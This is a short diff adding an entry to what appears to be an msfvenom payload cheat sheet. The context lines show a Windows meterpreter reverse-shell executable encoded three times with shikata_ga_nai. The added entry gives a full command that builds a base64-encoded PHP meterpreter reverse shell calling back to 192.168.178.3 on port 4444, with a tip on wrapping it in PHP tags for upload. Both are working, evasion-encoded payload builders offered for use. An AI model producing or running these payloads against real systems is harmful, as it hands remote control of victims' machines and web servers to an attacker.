@@ -85,3 +85,9 @@ Encoder:
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 
 One can also use the -a to specify the architecture or the --platform
+
+15. php shell with encoder
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.178.3 LPORT=4444 -e php/base64 -f raw > /root/Desktop/msfvenom.php
+Note: Don't forget to add <?php and ?> in to msfvenom.php file
+
+
